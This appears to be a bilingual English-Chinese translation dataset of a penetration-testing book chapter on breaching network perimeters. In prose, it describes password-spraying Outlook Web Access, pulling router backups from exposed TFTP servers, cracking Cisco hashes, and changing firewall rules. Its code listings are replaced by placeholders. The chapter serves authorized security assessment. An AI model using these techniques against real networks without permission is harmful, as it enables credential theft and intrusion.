- en: Chapter 7. Cracking the Perimeter with Python
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 第7章。用Python破解边界
- en: The toughest thing most assessors have to contend with is figuring a way to
    break into an internal network from over the Internet without phishing the organization's
    populace. There are occasionally widely exposed networks, but the majority of
    organizations have learned to tighten their external perimeters. Unfortunately,
    there is still the systemic problem of a hard exterior, and then a softer interior
    with light monitoring controls, which are not structured to prevent real malicious
    actors from compromising resources. This means that we should simulate the activity
    that malicious actors execute to crack the perimeter. This in turn means understanding
    what the typical perimeter looks like today.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数评估人员必须应对的最困难的问题是找到一种方法，从互联网上打破内部网络，而不会钓鱼组织的民众。有时会有广泛暴露的网络，但大多数组织已经学会了加强外部边界。不幸的是，仍然存在一个硬外部和一个较软的内部，监控控制较轻，无法阻止真正的恶意行为者侵害资源。这意味着我们应该模拟恶意行为者执行的活动来破解边界。这反过来又意味着了解今天典型的边界是什么样子。
- en: Understanding today's perimeter
  id: totrans-2
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 理解今天的边界
- en: Some networks still have services exposed that they should not, but most of
    the time, these exposed services rarely present any exploitable risk. The highlighting
    of these specific examples will stage the mindset shift you need as an assessor
    who can crack the perimeter of an organization. These are not all-inclusive examples
    of what you may find exposed to the Internet, but they will highlight the commonalities.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 一些网络仍然暴露了不应该暴露的服务，但大多数情况下，这些暴露的服务很少会带来可利用的风险。这些具体例子的突出将引发您作为评估人员的心态转变，您可以破解组织的边界。这些并不是互联网上可能发现的所有例子，但它们将突出共同点。
- en: Clear-text protocols
  id: totrans-4
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 明文协议
- en: '**File Transfer Protocol** (**FTP**) and Telnet are examples of clear-text
    protocols, which could be exposed to the perimeter and are usually do not present
    the risk most automated tools rank them. This is unless the server contains critical
    data or can lead to critical data access, has known **Remote Code Execution**
    (**RCE**) vulnerabilities, or the solution has default or known credentials within
    it. They should still not be exposed to the Internet, but they are often not as
    dangerous as most **Vulnerability Management Systems** (**VMS**) rank the weakness.
    The reason for this is that for an attacker to take advantage of it, he or she
    has four primary methods of compromising an account.'
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 文件传输协议（FTP）和Telnet是明文协议的例子，可能会暴露在边界上，并且通常不会带来大多数自动化工具所排名的风险。除非服务器包含关键数据或可以导致关键数据访问，具有已知的远程代码执行（RCE）漏洞，或者解决方案中有默认或已知的凭据。它们仍然不应该暴露在互联网上，但它们通常不像大多数漏洞管理系统（VMS）所排名的那样危险。原因是攻击者要利用它，他或她有四种主要方法来破坏一个帐户。
- en: The most common is by sniffing the credentials, which means that he or she has
    to be either locally present at the client or server side of the communication,
    or in the channel through the routed path. The second method is by compromising
    a system that stores these credentials. The third is by executing some type of
    social engineering attack, which means that if a user is susceptible to the attack,
    those credentials may warrant access to many other services as well and not only
    clear text protocols. The fourth is by executing an online credential attack against
    the service, such as a password spray, dictionary attack, or brute force. This
    is not to say that there is no risk related to clear-text protocols, but instead
    to point out that it is more difficult to exploit than what the VMS solutions
    advertise.
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 最常见的方法是嗅探凭据，这意味着他或她必须在通信的客户端或服务器端本地存在，或者在通过路由路径的通道中。第二种方法是通过破坏存储这些凭据的系统。第三种是通过执行某种类型的社会工程攻击，这意味着如果用户容易受到攻击，这些凭据可能会获得对许多其他服务的访问权限，而不仅仅是明文协议。第四种是对服务执行在线凭据攻击，例如密码喷射、字典攻击或暴力破解。这并不是说明文协议没有风险，而是指出它比VMS解决方案所宣传的更难利用。
- en: Web applications
  id: totrans-7
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Web应用程序
- en: From years of assessments, compromises, and recommendations brought forth by
    security engineers, the primary example of exposed services today are web applications.
    These applications can be on a variety of ports, including nonstandard ports.
    They are often load balanced and potentially served through complex **Content
    Delivery Networks** (**CDN**), which effectively serve cached versions of the
    material provided from servers closer to the requesting user base. Additionally,
    these applications can be served from virtualized platforms that are sandboxed
    from other systems, within a provider's environment. So, even if you do crack
    the web application, you may not gain access to the target network. Keep this
    in mind if you are wondering why you cannot get anywhere after cracking the web
    application system. Also ensure that you have permission to test networks that
    are not controlled by the client.
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 通过多年的评估、妥协和安全工程师提出的建议，今天暴露的服务的主要例子是Web应用程序。这些应用程序可以在各种端口上，包括非标准端口。它们通常是负载平衡的，可能通过复杂的内容交付网络（CDN）提供，这有效地提供了从更接近请求用户基地的服务器提供的材料的缓存版本。此外，这些应用程序可以从虚拟化平台提供，这些平台与其他系统隔离在提供商的环境中。因此，即使您破解了Web应用程序，您可能也无法访问目标网络。如果您想知道为什么在破解Web应用程序系统后无法取得任何进展，请记住这一点。还要确保您有权限测试客户端未受控制的网络。
- en: Encrypted remote access services
  id: totrans-9
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 加密远程访问服务
- en: Services such as **Remote Desktop Protocol** (**RDP**) and **Secure Shell**
    (**SSH**), for example, often provide direct access to an internal network. These
    services can be protected by multifactor authentication and they are encrypted,
    which means that executing **Man-in-the-Middle** (**MitM**) attacks is far more
    difficult. So, targeting these services will depend on which controls are not
    in place versus the fact that they are present.
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，**远程桌面协议**（**RDP**）和**安全外壳**（**SSH**）等服务通常提供对内部网络的直接访问。这些服务可以通过多因素身份验证进行保护，并且它们是加密的，这意味着执行**中间人**（**MitM**）攻击要困难得多。因此，针对这些服务的攻击将取决于未设置的控制措施，而不是它们的存在。
- en: Virtual Private Networks (VPNs)
  id: totrans-11
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 虚拟专用网络（VPN）
- en: In addition to web services, the other most common exposed service to the Internet
    are VPNs, which include, but not limited to **Point-to-Point Tunneling Protocol
    (PPTP)**, **Internet Security Association and Key Management Protocol (ISAKMP)**,
    or others. Attacks against these services are often multistage and require gaining
    other pieces of information, such as the group name or group password. This would
    be in addition to the standard username and password to authenticate as the specific
    user.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 除了Web服务之外，暴露在互联网上的另一个最常见的服务是VPN，其中包括但不限于**点对点隧道协议（PPTP）**，**互联网安全协会和密钥管理协议（ISAKMP）**等。对这些服务的攻击通常是多阶段的，并且需要获取其他信息，例如组名或组密码。这将是除了标准用户名和密码之外，作为特定用户进行身份验证的额外步骤。
- en: Many times, depending on the implementation, you may even need the specific
    software to associate with the device, such as Citrix or Cisco AnyConnect. Some
    vendors even have fees associated with the licensing of copies of their VPN software,
    so even if you do find all the necessary details, you may still need to find a
    copy of software that works, or the correct version. Additionally, pirating versions
    of these software components, as against purchasing them, may even open your or
    your client's network to compromises by using poisoned versions that may have
    their own liabilities.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 许多时候，根据实施情况，您甚至可能需要特定的软件与设备关联，例如Citrix或Cisco AnyConnect。一些供应商甚至对其VPN软件的许可副本收取费用，因此即使您找到了所有必要的详细信息，您可能仍然需要找到一个有效的软件副本或正确的版本。此外，盗版这些软件组件，而不是购买它们，甚至可能通过使用有自己责任的毒害版本来打开您或您客户的网络，使其面临妥协的风险。
- en: Mail services
  id: totrans-14
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 邮件服务
- en: We have spoken extensively about the manners in which mail services can be exploited.
    You will still see these services exposed, which means that there may still be
    an opportunity to find the desired details.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经广泛讨论了邮件服务可能被利用的方式。您仍然会看到这些服务暴露在外，这意味着可能仍然有机会找到所需的详细信息。
- en: Domain Name Service (DNS)
  id: totrans-16
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 域名服务（DNS）
- en: Services related to identifying **Internet Protocol** (**IP**) addresses related
    to **Fully Qualified Domain Names** (**FQDN**). Many times, these may be in the
    provided IP ranges, but they are actually out of scope, as they are owned by **Internet
    Service Providers** (**ISP**). Additionally, the vulnerabilities of yesterday,
    such as zone transfers, are not usually exploitable in today's networks.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 与识别与**完全合格域名**（**FQDN**）相关的**Internet Protocol**（**IP**）地址有关的服务。许多时候，这些可能在提供的IP范围内，但实际上超出了范围，因为它们是由**互联网服务提供商**（**ISP**）拥有的。此外，昨天的漏洞，如区域传输，在今天的网络中通常不容易被利用。
- en: User Datagram Protocol (UDP) services
  id: totrans-18
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 用户数据报协议（UDP）服务
- en: In addition to the services already mentioned that run as UDP services, you
    may find **Simple Network Management Protocol** (**SNMP**) and **Trivial File
    Transfer Protocol** (**TFTP**). Both of these services can provide details of
    and access to systems, depending on the information they reveal. SNMP can provide
    system details if you find the correct community string, and sometimes, it can
    even provide passwords to the system itself if the version is old enough, though
    this is much rarer on Internet-facing systems. TFTP, on the other hand, is used
    as a primary means to back up configurations for network devices, and firewall
    administrators often mistakenly expose the service to the Internet from a **Demilitarized
    Zone** (**DMZ**) or semi-trusted network.
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 除了已经提到的作为UDP服务运行的服务之外，您可能会发现**简单网络管理协议**（**SNMP**）和**简单文件传输协议**（**TFTP**）。这两种服务都可以提供系统的详细信息和访问权限，具体取决于它们所透露的信息。如果找到正确的社区字符串，SNMP可以提供系统详细信息，有时甚至可以提供系统本身的密码，尽管这在面向互联网的系统上非常罕见。另一方面，TFTP被用作网络设备配置的主要手段，防火墙管理员经常错误地将该服务从**非军事区**（**DMZ**）或半受信任的网络暴露到互联网上。
- en: Note
  id: totrans-20
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: You can set up your own Ubuntu TFTP server to execute this attack against by
    downloading Ubuntu from [http://www.ubuntu.com/download/alternative-downloads](http://www.ubuntu.com/download/alternative-downloads)
    and setting up the server with details from [http://askubuntu.com/questions/201505/how-do-i-install-and-run-a-tftp-server](http://askubuntu.com/questions/201505/how-do-i-install-and-run-a-tftp-server).
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以设置自己的Ubuntu TFTP服务器来执行这种攻击，方法是从[http://www.ubuntu.com/download/alternative-downloads](http://www.ubuntu.com/download/alternative-downloads)下载Ubuntu，并使用[http://askubuntu.com/questions/201505/how-do-i-install-and-run-a-tftp-server](http://askubuntu.com/questions/201505/how-do-i-install-and-run-a-tftp-server)中的详细信息设置服务器。
- en: Understanding the link between accounts and services
  id: totrans-22
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 了解帐户和服务之间的联系
- en: When looking at resources to target in facing the Internet, you are trying to
    determine what services may have exposures that allow you to gain access to critical
    services. So, for example, SSH or Telnet may not be linked to a Windows account
    authentication unless the organization is very mature and is using a product such
    as Centrify. As such, dictionary attacks against these types of services may not
    provide access to a resource that will allow you to move laterally using the details
    extracted. Additionally, most administrative teams have pretty good monitoring
    of Linux and Unix based resources in the security environment due to the ease
    of incorporating such devices.
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 在面对互联网的资源时，你正在尝试确定哪些服务可能存在漏洞，使你能够访问关键服务。因此，例如，SSH或Telnet可能与Windows帐户身份验证无关，除非组织非常成熟，并且正在使用诸如Centrify之类的产品。因此，针对这些类型的服务的字典攻击可能无法访问允许你使用提取的详细信息进行横向移动的资源。此外，由于易于整合此类设备，大多数管理团队对Linux和基于Unix的资源在安全环境中具有相当好的监控。
- en: Cracking inboxes with Burp Suite
  id: totrans-24
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用Burp Suite破解收件箱
- en: We highlighted how to run password sprays with Burp Suite in [Chapter 6](ch06.html
    "Chapter 6. Assessing Web Applications with Python"), *Assessing Web Applications
    with Python*. One of the best targets to hit with Burp Suite is the **Outlook
    Web Access** (**OWA**) interface which faces the Internet. This is one of the
    simplest attacks you can carry out, but it is one of the loudest as well. You
    should always reduce the timing to hit the inboxes and use very common passwords
    that conform to the Active Directory's complexity requirements as mentioned in
    previous chapters.
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在[第6章](ch06.html "第6章。使用Python评估Web应用程序")中强调了如何使用Burp Suite进行密码喷洒，*使用Python评估Web应用程序*。使用Burp
    Suite最好的目标之一是面向互联网的**Outlook Web Access**（**OWA**）界面。这是你可以进行的最简单的攻击之一，但也是最响亮的攻击之一。你应该始终减少命中收件箱的时间，并使用符合Active
    Directory复杂性要求的非常常见的密码，如前几章中所述。
- en: Once you have identified a response with a different byte size when compared
    to previous requests may highlight that you have found an active inbox with a
    valid credential set. Use these details to access the inbox and look for critical
    data. Critical data includes anything that could be considered sensitive to the
    company, which would highlight risk to the leadership or showcase the need for
    immediate or planned activities, which would remediate said risk. It also includes
    anything that may allow you to get access to the organization itself.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦你确定了与之前请求相比具有不同字节大小的响应，可能会突出显示你已经找到了一个具有有效凭据集的活动收件箱。使用这些详细信息访问收件箱，并寻找关键数据。关键数据包括任何可能被认为对公司敏感的东西，这将突出对领导层的风险或展示需要立即或计划的活动，以纠正该风险。它还包括任何可能允许你访问组织本身的东西。
- en: Examples include passwords and usernames sent by e-mail, KeePass or LastPass
    files, remote access instructions to the network, VPN software, and sometimes
    even software tokens. Think about the stuff your organization sends around in
    e-mail; if there is no multifactor authentication, it is a great option for attack
    vectors. To this end, more organizations have moved to multifactor authentication,
    and as such, this attack vector is disappearing.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 示例包括通过电子邮件发送的密码和用户名，KeePass或LastPass文件，网络的远程访问指令，VPN软件，有时甚至是软件令牌。想想你的组织在电子邮件中发送的东西；如果没有多因素身份验证，这是攻击向量的一个很好的选择。为此，越来越多的组织已经转向了多因素身份验证，因此，这种攻击向量正在消失。
- en: Identifying the attack path
  id: totrans-28
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 识别攻击路径
- en: As mentioned in many books, including this one, people often forget about UDP.
    Often, this is partly because the response from scans against UDP services often
    lies. Return data from tools such as `nmap` and `scapy` can provide responses
    for ports that are actually open, but reported as `Open|Filtered`.
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 正如许多书籍中所述，包括本书在内，人们经常忘记UDP。这在一定程度上是因为针对UDP服务的扫描的响应经常是虚假的。来自诸如`nmap`和`scapy`之类的工具的返回数据可以为实际上是打开的端口提供响应，但报告为`Open|Filtered`。
- en: Understanding the limitations of perimeter scanning
  id: totrans-30
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 了解周界扫描的限制
- en: As an example, research on a host indicates that a TFTP server may be active
    on it based on the descriptive banner of another service, but scans using `nmap`
    point to the port as `open|filtered`.
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 举例来说，对主机的研究表明，基于另一个服务的描述性横幅，TFTP服务器可能在其上处于活动状态，但使用`nmap`进行的扫描指向该端口为`open|filtered`。
- en: 'The following figure, shows the response for the UDP service TFTP as open|filtered,
    as described preceding, even though it known to be open:'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 以下图显示了UDP服务TFTP的响应为open|filtered，如前所述，尽管它已知为打开：
- en: '![Understanding the limitations of perimeter scanning](img/B04315_07_01.jpg)'
  id: totrans-33
  prefs: []
  type: TYPE_IMG
  zh: '![了解周界扫描的限制](img/B04315_07_01.jpg)'
- en: 'This means that the port may actually be open, but when copious responses show
    many ports to be represented in this way, you may have less trust in the results.
    Banner grabbing of each of these ports and protocols may not be possible, as there
    may be no actual banner to grab. Tools such as `scapy` can help resolve this issue
    by providing more detailed responses so that you can, in turn, interpret them
    yourself. As an example, using the following command could possibly elicit a response
    from a TFTP service:'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 这意味着该端口实际上可能是打开的，但当大量响应显示许多端口以这种方式表示时，你可能对结果的信任度较低。抓取每个端口和协议的横幅可能是不可能的，因为可能没有实际的横幅可供抓取。诸如`scapy`之类的工具可以通过提供更详细的响应来解决这个问题，以便你自己解释。例如，使用以下命令可能会引发TFTP服务的响应：
- en: '[PRE0]'
  id: totrans-35
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: 'The following figure shows the execution of a UDP port scan from Scapy to determine
    if the TFTP service is truly exposed or not:'
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 以下图显示了从Scapy执行UDP端口扫描，以确定TFTP服务是否真正暴露或不暴露：
- en: '![Understanding the limitations of perimeter scanning](img/B04315_07_02.jpg)'
  id: totrans-37
  prefs: []
  type: TYPE_IMG
  zh: '![了解周界扫描的限制](img/B04315_07_02.jpg)'
- en: 'We see we have one unanswered response, about which we can get the details
    using the `summary()` function, as shown here:'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 我们看到有一个未回答的响应，可以使用`summary()`函数获取详细信息，如下所示：
- en: '![Understanding the limitations of perimeter scanning](img/B04315_07_03.jpg)'
  id: totrans-39
  prefs: []
  type: TYPE_IMG
  zh: '![了解周界扫描的限制](img/B04315_07_03.jpg)'
- en: 'This is not all that useful when scanning one port and one IP address, but
    had the test been for multiple IP addresses or ports, like the following scan,
    the `summary()` and `display()` functions would have been extremely useful:'
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 当扫描一个端口和一个IP地址时，这并不是很有用，但如果测试的是多个IP地址或端口，像下面的扫描一样，`summary()`和`display()`函数将会非常有用：
- en: '[PRE1]'
  id: totrans-41
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'Regardless of the results, TFTP is not responding to these scans, but this
    does not necessarily mean that the service is closed. Depending on the configuration
    and controls, most TFTP services will not respond to scans. Services such as these
    can be misleading, especially if a firewall is enabled. If you attempt to connect
    to the service, you may receive the same response as you would if no firewall
    was filtering the response to the actual client, as shown in this screenshot:'
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 不管结果如何，TFTP对这些扫描没有响应，但这并不一定意味着服务已关闭。根据配置和控制，大多数TFTP服务不会对扫描做出响应。这样的服务可能会产生误导，特别是如果启用了防火墙。如果你尝试连接到服务，你可能会收到与没有防火墙过滤实际客户端响应相同的响应，如下面的截图所示：
- en: '![Understanding the limitations of perimeter scanning](img/B04315_07_04.jpg)'
  id: totrans-43
  prefs: []
  type: TYPE_IMG
  zh: '![了解周界扫描的限制](img/B04315_07_04.jpg)'
- en: This example was meant to highlight the fact that when it comes to exposed services,
    firewalls, and other protection mechanisms, you cannot trust your UDP scanners.
    You need to consider other details, such as hostnames, other service banners,
    and information sources. We are focusing on TFTP as an example because if it is
    exposed, it provides a neat feature for us as attackers; it does not require credentials
    to extract data. This means that we only need to know the proper filename to download
    it.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 这个例子旨在强调当涉及到暴露的服务、防火墙和其他保护机制时，你不能信任你的UDP扫描器。你需要考虑其他细节，比如主机名、其他服务横幅和信息来源。我们专注于TFTP作为一个例子，因为如果它暴露了，它对我们作为攻击者提供了一个很好的功能；它不需要凭据来提取数据。这意味着我们只需要知道正确的文件名来下载它。
- en: Downloading backup files from a TFTP server
  id: totrans-45
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 从TFTP服务器下载备份文件
- en: So, to determine whether this system actually contains data we would like, we
    need to query the service for actual filenames. If we guess the correct filename,
    we can download the file on our system, but if we don't, the service will provide
    no response. This means that we have to identify likely filenames based on other
    service banners. As mentioned before, TFTP is most often used to store backups
    for network devices, and if the automated archive feature is used, we may be able
    to make an educated guess of the actual filename.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 因此，要确定这个系统是否实际包含我们想要的数据，我们需要查询实际文件名的服务。如果我们猜对了文件名，我们可以在我们的系统上下载文件，但如果没有，服务将不会提供任何响应。这意味着我们必须根据其他服务横幅来识别可能的文件名。如前所述，TFTP最常用于存储网络设备的备份，如果使用了自动存档功能，我们可能能够对实际文件名做出合理的猜测。
- en: Typically, administrators use the hostname as the base name for the backup file,
    and then the backup file is incremented over time. Therefore, if the hostname
    is `example_router`, then the first backup that uses this feature would be `example_router-1`.
    So if you know the hostname, you can increment you can increment the number that
    follows the hostname, which represents the potential backup filenames. These requests
    could be done through tools such as Hydra and Metasploit, but you would have to
    generate a custom word list based on the hostname identified.
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 通常，管理员使用主机名作为备份文件的基本名称，然后随着时间的推移递增备份文件。因此，如果主机名是`example_router`，那么使用这个功能的第一个备份将是`example_router-1`。因此，如果你知道主机名，你可以递增跟随主机名的数字，这代表了潜在的备份文件名。这些请求可以通过Hydra和Metasploit等工具完成，但你需要根据识别出的主机名生成一个自定义的单词列表。
- en: Instead, we can write a just in time Python script to meet this specific need,
    which would be a better fit. Just in time scripts are a concept that top-tier
    assessors use regularly. They generate a script to perform a task that no current
    tools perform with ease for a specific need. This means that we can find a way
    to automatically manipulate the environment in an unintended way that a VMS would
    not flag.
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 相反，我们可以编写一个及时的Python脚本来满足这个特定的需求，这将更合适。及时脚本是顶级评估者经常使用的概念。它们生成一个脚本来执行当前工具无法轻松执行的任务。这意味着我们可以找到一种自动操纵环境的方式，这是VMS不会检测到的。
- en: Determining the backup filenames
  id: totrans-49
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 确定备份文件名
- en: To determine the potential backup filename range, you need to identify the hostnames
    that might be part of the regular backup routine. This means connecting to services
    such as Telnet, FTP, and SSH to extract banners. Grabbing banners of numerous
    services can be time-consuming, even with Bash, `for` loops, and `netcat`. To
    overcome this challenge, we can write a short script that will connect to all
    of these services for us, as shown in the following code, and even expand on it
    if needed in future.
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 要确定潜在的备份文件名范围，你需要识别可能是常规备份例程的主机名。这意味着连接到Telnet、FTP和SSH等服务，提取横幅。获取大量服务的横幅可能会耗费时间，即使使用Bash、`for`循环和`netcat`。为了克服这一挑战，我们可以编写一个短小的脚本，来代替我们连接所有这些服务，如下面的代码所示，甚至在未来需要时进行扩展。
- en: 'This script uses a list of ports and feeds them to each IP address tested.
    We are using a range of potential IP addresses appended as the forth octet to
    a base IP address. You could generate additional code to read IPs from a file
    or create a dynamic list from **Classless Inter-domain Routing** (**CIDR**) addresses,
    but that would take additional time. The following script, as it stands, meets
    our immediate requirement:'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 这个脚本使用一个端口列表，并将它们提供给每个被测试的IP地址。我们使用一系列潜在的IP地址作为基本IP地址的第四个八位字节。你可以生成额外的代码来从文件中读取IP，或者从**无类域间路由**（**CIDR**）地址创建一个动态列表，但这将需要额外的时间。如下所示，当前的脚本满足了我们的即时需求：
- en: '[PRE2]'
  id: totrans-52
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: When the script responds with active banners, we can go and grab the details
    of the services. This can be done with tools such as `nmap`, but the framework
    of the script can be adjusted to grab more or less details, perform follow-up
    requests, and even languish for longer periods of times if necessary. So, this
    script could be used if `nmap` or other tools are not picking up details correctly.
    It should be noted that this is significantly slower than other tools, and it
    should be approached as a secondary tool, not a primary.
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 当脚本响应活动横幅时，我们可以去获取服务的详细信息。这可以使用`nmap`等工具来完成，但是脚本的框架可以调整以获取更多或更少的详细信息，执行后续请求，甚至在必要时延长时间。因此，如果`nmap`或其他工具没有正确获取详细信息，可以使用这个脚本。需要注意的是，这比其他工具慢得多，应该作为辅助工具而不是主要工具来对待。
- en: Note
  id: totrans-54
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: As just mentioned, `nmap` can do similar things at a faster pace using the NSE
    banner script, as described at [https://nmap.org/nsedoc/scripts/banner.html](https://nmap.org/nsedoc/scripts/banner.html).
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 正如刚才提到的，`nmap`可以使用NSE横幅脚本以更快的速度做类似的事情，如[https://nmap.org/nsedoc/scripts/banner.html](https://nmap.org/nsedoc/scripts/banner.html)中所述。
- en: 'From the banner grabbing results, we can now write a Python script that would
    be able to increment through potential backup filenames and try and download them.
    So, we are going to create a directory to store all the potential files that will
    be requested from this quick and script. Inside this directory, we can then list
    the contents and see which have more than 0 bytes of content. If we see that the
    content is more than 0 bytes, we know that we have successfully grabbed a backup
    file. We will create a directory called backups and run this script from it:'
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 从横幅抓取的结果中，我们现在可以编写一个Python脚本，该脚本可以递增地遍历潜在的备份文件名，并尝试下载它们。因此，我们将创建一个目录来存储从这个快速脚本中请求的所有潜在文件。在这个目录中，我们可以列出内容，并查看哪些内容超过了0字节。如果我们看到内容超过了0字节，我们就知道我们已经成功地获取了一个备份文件。我们将创建一个名为backups的目录，并从中运行这个脚本：
- en: '[PRE3]'
  id: totrans-57
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'As you can see, this script was written to look for backups of the router names
    from `example_router-0` to `example_router-99`. The results can be seen in the
    output directory, as follows:'
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 正如你所看到的，这个脚本是用来查找从`example_router-0`到`example_router-99`的路由器备份的。结果可以在输出目录中看到，如下所示：
- en: '![Determining the backup filenames](img/B04315_07_05.jpg)'
  id: totrans-59
  prefs: []
  type: TYPE_IMG
  zh: '![确定备份文件名](img/B04315_07_05.jpg)'
- en: 'Now, we only need to determine how big each file is to find an actual backup
    for the router using the `ls -l` command. The sample output of this command can
    be seen in the following screenshot. As you can see here, `example_router-5` seems
    to be an actual file that contains data:'
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们只需要确定每个文件的大小，以找到实际的路由器备份，使用`ls -l`命令。这个命令的示例输出可以在下面的截图中看到。正如你在这里看到的，`example_router-5`似乎是一个包含数据的实际文件：
- en: '![Determining the backup filenames](img/B04315_07_06.jpg)'
  id: totrans-61
  prefs: []
  type: TYPE_IMG
  zh: '![确定备份文件名](img/B04315_07_06.jpg)'
- en: Cracking Cisco MD5 hashes
  id: totrans-62
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 破解思科MD5哈希
- en: 'Now we can see whether there are any hashed passwords in the backup file, as
    shown here:'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们可以看看备份文件中是否有任何哈希密码，如下所示：
- en: '![Cracking Cisco MD5 hashes](img/B04315_07_07.jpg)'
  id: totrans-64
  prefs: []
  type: TYPE_IMG
  zh: '![破解思科MD5哈希](img/B04315_07_07.jpg)'
- en: 'The tool John the Ripper can now be used to crack these hashes after they have
    been formatted correctly. To do this, put these hashes in a format that appears
    as follows:'
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: John the Ripper工具现在可以用来破解这些哈希，只要它们被正确格式化。为此，将这些哈希放在以下格式中：
- en: '[PRE4]'
  id: totrans-66
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'The tool John the Ripper requires the data from the back-up file to be prsented
    in a particular format so that it can be processed. The following excerpt shows
    how these hashes need to be formatted so that they can be processed:'
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: John the Ripper工具需要备份文件中的数据以特定格式呈现，以便进行处理。以下摘录显示了这些哈希需要以何种格式呈现才能进行处理：
- en: '[PRE5]'
  id: totrans-68
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'We then place these hashes in a text file such as `cisco_hash` and run John
    the Ripper against it, as follows:'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，我们将这些哈希放在一个文本文件中，比如`cisco_hash`，并对其运行John the Ripper，如下所示：
- en: '[PRE6]'
  id: totrans-70
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: Once done, you can look at the results with `john --show cisco_hash`, and use
    the extracted credentials to log in to the device to elevate your privileges and
    adjust its details. Using this access, and if the router was the primary perimeter
    protection, you could potentially adjust the protections to provide your public
    IP address additional access to internal resources.
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 完成后，您可以使用`john --show cisco_hash`查看结果，并使用提取的凭据登录设备，提升权限并调整其详细信息。利用这种访问权限，如果路由器是主要的外围保护，您可以潜在地调整保护措施，以使您的公共IP地址能够访问内部资源。
- en: Tip
  id: totrans-72
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: Remember to use that script you wrote to grab your public IP address to make
    your life easier.
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 记得使用你写的脚本来获取你的公共IP地址，让生活更轻松。
- en: You should approach doing this very carefully, even on a red team engagement.
    Manipulation of perimeter firewalls may adversely affect the organization. Instead,
    you should consider highlighting the access you have achieved and request that
    an entry be made for your public IP address to access the semi-trusted or protected
    network, depending on the nature of the engagement. Keep in mind that unless a
    device has a routable IP as in a public or Internet-facing address, you may still
    not be able to see it from over the Internet, but you may be able to see ports
    and services that were previously obfuscated from you. An example of this is a
    web server that has RDP enabled behind a firewall. Once the adjustment of perimeter
    rules has been executed, you may have access to RDP on the web server.
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
